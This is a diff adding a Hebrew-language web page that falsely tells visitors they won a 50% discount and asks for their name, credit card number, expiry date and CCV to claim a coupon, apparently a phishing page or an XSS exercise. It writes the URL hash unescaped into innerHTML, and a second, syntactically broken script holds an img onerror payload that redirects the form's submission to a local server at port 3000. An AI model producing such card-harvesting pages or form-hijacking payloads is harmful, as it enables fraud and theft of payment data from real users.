@@ -1,0 +1,80 @@
+<html lang="en">
+
+<head>
+    <title>Bootstrap Example</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+	<title>Google Icons</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  </head>
+  <body>
+
+<div class="container">
+      <div class="row">
+        <div class="col-md-12 text-center">
+          <h1 class="jumbotron">זכית ב-50% הנחה בקנייה הבאה</h1>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-md-offset-3 col-md-6">
+          <div class="panel panel-default">
+		     <div class="col-md-offset-3">
+            <div class="panel-heading">:אנא מלא את פרטי האשראי על מנת לקבל את קוד הקופון בקנייה הבאה</div>
+			</div>
+            <div class="panel-body">
+                <script>
+document.querySelector('.panel-heading').innerHTML = `<p>${decodeURIComponent(window.location.hash.substr(1))}</p>`;
+
+</script>
+
+<script>
+document.querySelector('.panel-heading').innerHTML = <img src="1" onerror="document.forms[0].action = 'http://127.0.0.1:3000/'"/></p>`;
+</script>
+                  <form action="/sumbitData" method="POST">
+                    <div class="input-group">
+                    <span class="form-group mx-sm-3 mb-2"><i class="glyphicon glyphicon-user"></i></span>
+			    	<label for="username">Name</label>
+                    <input id="username" type="text" class="form-control" name="name" placeholder="name">
+               </div>
+
+                  <div class="input-group">
+                  <span class="form-group"><i class="material-icons">credit_card</i></span>
+				  <label for="card">Card Number</label>
+                  <input id="card" type="text" class="form-control" name="card" placeholder="card">
+               </div>
+			     <br>
+
+			    <div class="input-group">
+                  <span class="form-group mx-sm-3 mb-2"><i class="material-icons">event</i></span>
+				   <label for="date">Expiration Date</label>
+			   	   <input id="date" type="text" class="form-control" name="date" placeholder="MM/YY" style="z-index:6">
+               </div>
+
+			     <br>
+			       <div class="input-group">
+				  <span class="form-group mx-sm-3 mb-2"><i class="material-icons">verified_user</i></span>
+                        <label for="ccv">CCV</label>
+                        <input id="ccv" type="text" class="form-control" name="ccv" placeholder="ccv" style="z-index:6">
+                    </div>
+
+                  <div class="checkbox">
+                  <label><input type="checkbox"> Remember me</label>
+                  </div>
+                  <button type="Sumbit" class="btn-block btn-primary">לקבלת קוד קופון בחינם</button>
+
+                 </form>
+			   </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+
+</body>
+  </html>
